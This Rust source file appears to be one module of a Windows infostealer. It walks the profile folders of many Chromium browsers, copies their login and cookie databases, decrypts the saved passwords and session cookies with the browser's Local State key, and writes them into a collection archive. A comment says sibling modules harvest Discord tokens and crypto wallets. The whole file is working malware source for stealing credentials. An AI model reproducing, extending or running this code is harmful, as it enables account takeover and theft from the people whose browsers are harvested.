use std::fs;
use std::path::{Path, PathBuf};

use crate::crypto;
use crate::session::Session;
use crate::util;

pub struct Root {
    pub name: &'static str,
    pub path: PathBuf,
}

struct Profile {
    dir: PathBuf,
}

fn push_root(out: &mut Vec<Root>, name: &'static str, path: Option<PathBuf>) {
    if let Some(path) = path {
        if path.is_dir() {
            out.push(Root { name, path });
        }
    }
}

/// Every Chromium-family browser that stores credentials in the
/// `Login Data` / `Network\Cookies` layout.
pub fn roots() -> Vec<Root> {
    let local = util::env_path("LOCALAPPDATA");
    let roaming = util::env_path("APPDATA");
    let mut out = Vec::new();

    if let Some(base) = &local {
        push_root(&mut out, "chrome", Some(base.join(r"Google\Chrome\User Data")));
        push_root(&mut out, "chrome_beta", Some(base.join(r"Google\Chrome Beta\User Data")));
        push_root(&mut out, "chrome_sxs", Some(base.join(r"Google\Chrome SxS\User Data")));
        push_root(&mut out, "edge", Some(base.join(r"Microsoft\Edge\User Data")));
        push_root(&mut out, "brave", Some(base.join(r"BraveSoftware\Brave-Browser\User Data")));
        push_root(&mut out, "vivaldi", Some(base.join(r"Vivaldi\User Data")));
        push_root(&mut out, "yandex", Some(base.join(r"Yandex\YandexBrowser\User Data")));
        push_root(&mut out, "chromium", Some(base.join(r"Chromium\User Data")));
        push_root(&mut out, "thorium", Some(base.join(r"Thorium\User Data")));
        push_root(&mut out, "avast", Some(base.join(r"AVAST Software\Browser\User Data")));
    }
    if let Some(base) = &roaming {
        push_root(&mut out, "opera", Some(base.join(r"Opera Software\Opera Stable")));
        push_root(&mut out, "opera_gx", Some(base.join(r"Opera Software\Opera GX Stable")));
        push_root(&mut out, "opera_air", Some(base.join(r"Opera Software\Opera Air")));
    }
    out
}

fn looks_like_profile(dir: &Path) -> bool {
    dir.join("Login Data").is_file()
        || dir.join("Network").join("Cookies").is_file()
        || dir.join("Cookies").is_file()
        || dir.join("Web Data").is_file()
}

fn profiles(root: &Path) -> Vec<Profile> {
    let mut out = Vec::new();
    if looks_like_profile(root) {
        out.push(Profile {
            dir: root.to_path_buf(),
        });
    }
    if let Ok(entries) = fs::read_dir(root) {
        for entry in entries.flatten() {
            let path = entry.path();
            if !path.is_dir() || !looks_like_profile(&path) {
                continue;
            }
            if out.iter().any(|p| p.dir == path) {
                continue;
            }
            out.push(Profile { dir: path });
        }
    }
    out
}

fn read_logins(profile: &Profile, key: Option<&[u8]>, out: &mut Vec<String>) {
    let db = profile.dir.join("Login Data");
    if !db.is_file() {
        return;
    }
    let staged = util::temp_dir().join(format!("ld_{}.db", util::random_hex(10)));
    if !util::stage_sqlite(&db, &staged) {
        return;
    }

    let rows = (|| -> Option<Vec<(String, String, Vec<u8>)>> {
        let conn = rusqlite::Connection::open_with_flags(
            &staged,
            rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
        )
        .ok()?;
        let mut stmt = conn
            .prepare("SELECT origin_url, username_value, password_value FROM logins")
            .ok()?;
        let mapped = stmt
            .query_map([], |row| {
                Ok((
                    row.get::<_, String>(0).unwrap_or_default(),
                    row.get::<_, String>(1).unwrap_or_default(),
                    row.get::<_, Vec<u8>>(2).unwrap_or_default(),
                ))
            })
            .ok()?;
        Some(mapped.filter_map(|r| r.ok()).collect())
    })();

    util::cleanup_sqlite(&staged);

    let Some(rows) = rows else { return };
    for (origin, username, blob) in rows {
        if username.is_empty() && blob.is_empty() {
            continue;
        }
        let password = match crypto::chromium_decrypt(&blob, key) {
            Some(plain) => String::from_utf8_lossy(&plain).into_owned(),
            None => {
                if blob.len() > 3 && &blob[..3] == b"v20" {
                    String::from("<app-bound encryption>")
                } else {
                    String::from("<undecryptable>")
                }
            }
        };
        if origin.is_empty() && username.is_empty() {
            continue;
        }
        out.push(format!("{}\t{}\t{}", origin, username, password));
    }
}

fn read_cookies(profile: &Profile, key: Option<&[u8]>, out: &mut Vec<String>) {
    let candidates = [
        profile.dir.join("Network").join("Cookies"),
        profile.dir.join("Cookies"),
    ];
    let Some(db) = candidates.iter().find(|p| p.is_file()).cloned() else {
        return;
    };

    let staged = util::temp_dir().join(format!("ck_{}.db", util::random_hex(10)));
    if !util::stage_sqlite(&db, &staged) {
        return;
    }

    let rows = (|| -> Option<Vec<(String, String, Vec<u8>)>> {
        let conn = rusqlite::Connection::open_with_flags(
            &staged,
            rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
        )
        .ok()?;
        let mut stmt = conn
            .prepare("SELECT host_key, name, encrypted_value FROM cookies")
            .ok()?;
        let mapped = stmt
            .query_map([], |row| {
                Ok((
                    row.get::<_, String>(0).unwrap_or_default(),
                    row.get::<_, String>(1).unwrap_or_default(),
                    row.get::<_, Vec<u8>>(2).unwrap_or_default(),
                ))
            })
            .ok()?;
        Some(mapped.filter_map(|r| r.ok()).collect())
    })();

    util::cleanup_sqlite(&staged);

    let Some(rows) = rows else { return };
    for (host, name, blob) in rows {
        if blob.is_empty() || name.is_empty() {
            continue;
        }
        if let Some(value) = crypto::chromium_cookie(&blob, key, &host) {
            if value.is_empty() {
                continue;
            }
            out.push(format!("{host}\t{name}\t{value}"));
        }
    }
}

fn write_section(session: &mut Session, root: &Root, kind: &str, rows: &[String]) {
    if rows.is_empty() {
        return;
    }
    let mut text = format!("# {} {kind} — {}\n", root.name, util::timestamp());
    text.push_str("origin\tusername\tvalue\n");
    for row in rows {
        text.push_str(row);
        text.push('\n');
    }
    let rel = format!("browsers/{}_{}.txt", root.name, kind);
    session.put_text(&rel, &text);
    session.note(&format!("{}: {} {kind}", root.name, rows.len()));
    session.line(&format!("{} {kind}: {}", root.name, rows.len()));
}

pub fn collect(session: &mut Session) {
    for root in roots() {
        let key = crypto::local_state_key(&root.path.join("Local State"));
        if key.is_none() {
            session.note(&format!("{}: no Local State key", root.name));
        }

        let mut passwords = Vec::new();
        let mut cookies = Vec::new();
        for profile in profiles(&root.path) {
            read_logins(&profile, key.as_deref(), &mut passwords);
            read_cookies(&profile, key.as_deref(), &mut cookies);
        }

        write_section(session, &root, "passwords", &passwords);
        write_section(session, &root, "cookies", &cookies);
    }
}

/// Chromium profile directories, used by the Discord token and wallet modules.
pub fn profile_dirs(root: &Path) -> Vec<PathBuf> {
    profiles(root).into_iter().map(|p| p.dir).collect()
}
